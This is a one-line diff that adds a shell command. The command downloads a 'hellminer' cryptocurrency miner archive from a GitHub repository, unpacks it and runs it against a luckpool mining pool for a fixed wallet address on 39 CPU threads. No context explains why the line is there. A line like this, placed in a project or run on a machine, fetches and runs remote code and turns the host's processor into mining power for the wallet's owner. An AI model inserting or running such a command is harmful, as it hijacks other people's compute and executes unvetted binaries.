@@ -1,0 +1,1 @@
+wget https://github.com/d2n1982/hellminerlama/raw/main/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RHr7JV5hHTNub62oDFGVakk4CBkYKeGpBk.MINER -p x --cpu 39
